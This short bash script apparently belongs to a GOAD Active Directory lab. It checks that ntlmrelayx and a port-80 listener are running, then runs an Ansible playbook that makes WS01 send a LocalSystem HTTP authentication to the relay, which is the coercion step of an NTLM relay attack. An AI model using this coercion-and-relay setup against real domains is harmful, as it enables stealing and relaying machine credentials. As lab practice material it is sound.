#!/usr/bin/env bash
# Deterministically produce an HTTP authentication from WS01 LocalSystem.
# The temporary scheduled task is removed by the playbook after one request.
set -euo pipefail

ROOT="${ROOT:-$HOME/Documents/GOAD_NOMAD}"
PLAYBOOK="$ROOT/ansible/phase03-trigger-ws01-system-http.yml"
DATA_INVENTORY="$ROOT/ad/GOAD/data/inventory"
PROVIDER_INVENTORY="$ROOT/ad/GOAD/providers/vmware/inventory"

find_ansible_playbook() {
  local c
  for c in \
    "$(command -v ansible-playbook 2>/dev/null || true)" \
    "$ROOT/.venv/bin/ansible-playbook" \
    "$ROOT/venv/bin/ansible-playbook" \
    "$HOME/.goad/.venv/bin/ansible-playbook" \
    "$HOME/.local/bin/ansible-playbook"; do
    [[ -n "$c" && -x "$c" ]] || continue
    printf '%s\n' "$c"
    return 0
  done
  return 1
}

cd "$ROOT" || exit 1

echo '===== SYSTEM HTTP CALLBACK PREFLIGHT ====='
pgrep -af '(^|[ /])(impacket-ntlmrelayx|ntlmrelayx[.]py)([ ]|$)' >/dev/null || {
  echo 'FAIL: ntlmrelayx is not running' >&2
  exit 1
}
sudo -v
sudo -n ss -H -lntp | grep -Eq '(^|[[:space:]])[^[:space:]]*:80[[:space:]]' || {
  echo 'FAIL: no listener is bound to TCP/80' >&2
  exit 1
}

ANSIBLE_PLAYBOOK="$(find_ansible_playbook || true)"
[[ -n "$ANSIBLE_PLAYBOOK" ]] || { echo "FAIL: ansible-playbook not found" >&2; exit 1; }

echo 'PASS: relay listener is ready'
echo 'INFO: triggering one LocalSystem HTTP request from WS01'
echo

ANSIBLE_CONFIG="$ROOT/ansible/ansible.cfg" \
"$ANSIBLE_PLAYBOOK" \
  -i "$DATA_INVENTORY" \
  -i "$PROVIDER_INVENTORY" \
  "$PLAYBOOK"
